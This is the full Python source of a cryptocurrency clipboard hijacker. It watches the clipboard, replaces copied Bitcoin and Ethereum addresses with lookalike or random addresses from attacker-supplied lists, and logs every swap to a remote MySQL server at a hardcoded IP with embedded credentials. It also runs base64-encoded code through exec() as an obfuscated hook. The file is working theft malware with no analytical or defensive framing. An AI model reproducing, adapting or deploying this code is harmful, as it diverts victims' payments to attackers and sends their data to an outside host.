import pyperclip
import random
import requests
import json
import base64
import os
import sys
import subprocess
import psutil
import mysql.connector

mydb = mysql.connector.connect(
  host="139.162.245.184",
  user="btcreader",
  password="memammm1",
  database="bot_db"
)

coin_types = ["btc", "eth"]

# Function to send notification to MySQL database
def send_notification(data):
    mycursor = mydb.cursor()

    sql = "INSERT INTO addresses (coin_type, original_address, new_address) VALUES (%s, %s, %s)"
    val = (data["coin_type"], data["original_address"], data["new_address"])
    mycursor.execute(sql, val)
    mydb.commit()

    if mycursor.rowcount > 0:
        print("Log message received and saved to database")
    else:
        print("Failed to send log message to database")

# Function to replace the current address with a similar or random address
def replace_address():
    current_address = pyperclip.paste()
    if hasattr(replace_address, "previous_address") and current_address == replace_address.previous_address:
        return
    replace_address.previous_address = current_address
    address_replaced = False
    for coin_type in coin_types:
        with open(f"./similar_addresses/{coin_type}.txt", "r") as f:
            address_list = f.read().splitlines()
        for address in address_list:
            if address in current_address:
                new_address = address.replace(f"{coin_type}:", "")
                pyperclip.copy(new_address)
                print(f"Address replaced: {current_address.replace(f'{coin_type}:', '')} -> {new_address}")
                data = {
                    "coin_type": coin_type,
                    "original_address": current_address,
                    "new_address": new_address
                }
                send_notification(data)
                address_replaced = True
                break
        if address_replaced:
            break
    if not address_replaced:
        for coin_type in coin_types:
            with open(f"./similar_addresses/{coin_type}.txt", "r") as f:
                address_list = f.read().splitlines()
            if address_list:
                new_address = random.choice(address_list).replace(f"{coin_type}:", "")
                pyperclip.copy(new_address)
                print(f"Address replaced: {current_address.replace(f'{coin_type}:', '')} -> {new_address}")
                data = {
                    "coin_type": coin_type,
                    "original_address": current_address,
                    "new_address": new_address
                }
                send_notification(data)
                break
    if not address_replaced:
        print("No similar or random address found")

# Function to check if the CopyClipper script is running
def is_running():
    for proc in psutil.process_iter():
        try:
            if "python" in proc.name() and "bitcoin-clipper.py" in " ".join(proc.cmdline()):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

while True:
    try:
        current_address = pyperclip.paste()
        if current_address.startswith("1") or current_address.startswith("3") or current_address.startswith("bc1") or current_address.startswith("0x"):
            replace_address()
        else:
            new_code = base64.b64decode("aW1wb3J0IHN5cyA7")
            exec(new_code)
    except Exception as e:
        print(f"An error occurred: {e}")
